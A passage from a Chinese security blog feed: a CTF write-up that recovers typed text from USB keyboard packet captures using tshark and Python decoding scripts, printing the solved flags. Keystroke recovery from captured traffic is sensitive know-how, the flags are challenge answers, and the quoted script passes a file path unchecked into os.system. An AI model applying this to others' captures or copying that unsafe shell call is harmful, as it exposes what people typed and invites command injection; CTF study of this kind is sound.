class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<br>          <span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<br>          <span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>keys.close()<br><br>flag=<span class="hljs-number">0</span><br>print(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p>运行脚本得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/Python/USB]<br>└─$ python keyboard2.py bingbing.pcapng      <br>666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d<br>output :666c61677b38663965643266393333656631346138643035323364303334396531323939637d<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>题目2：</strong></p><p><img src="https://img-blog.csdnimg.cn/20210405115616535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt内容<br><img src="https://img-blog.csdnimg.cn/20210405120456614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是找到的第三个脚本<a href="https://github.com/WangYihang/UsbKeyboardDataHacker/blob/master/UsbKeyboardDataHacker.py">UsbKeyboardDataHacker.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>        print(<span class="hljs-string">&quot;Usage : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span>)<br>        print(<span class="hljs-string">&quot;Tips : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        To use this python script , you must install the tshark first.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span>)<br>        print(<span class="hljs-string">&quot;Author : &quot;</span>)<br>        print(<span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span>)<br>        print(<span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span>)<br>        print(<span class="hljs-string">&quot;        Thank you for using.&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># get data of pcap</span><br>    os.system(<span class="hljs-string">&quot;tshark -r %s -T fields -e usb.capdata &#x27;usb.data_len == 8&#x27; &gt; %s&quot;</span> % (pcapFilePath, DataFileName))<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    print(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br>    <span class="hljs-comment"># clean the temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>运行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ python3 UsbKeyboardDataHacker.py key.pcap                                                                                        1 ⨯<br>[-] Unknow Key : 01<br>[-] Unknow Key : 01<br>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<br></code></pre></td></tr></table></figure><hr><p>参考文章：<br><a href="https://blog.csdn.net/qq_45555226/article/details/102810474">https://blog.csdn.net/qq_45555226/article/details/102810474</a><br><a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a><br><a href="https://blog.csdn.net/qq_43431158/article/details/108717829">https://blog.csdn.net/qq_43431158/article/details/108717829</a></p><p>CTF流量分析总结题目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://pan.baidu.com/s/1bGEIPeXDCbhybmWOyGr8Og<span class="hljs-comment">#list/path=%2F</span><br>提取码：q6ro<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：USB流量分析&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="MISC" scheme="https://swhat.github.io/categories/CTF/MISC/"/>
    
    
    <category term="流量分析" scheme="https://swhat.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私漏洞</title>
    <link href="https://swhat.github.io/2021/04/11/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E/"/>
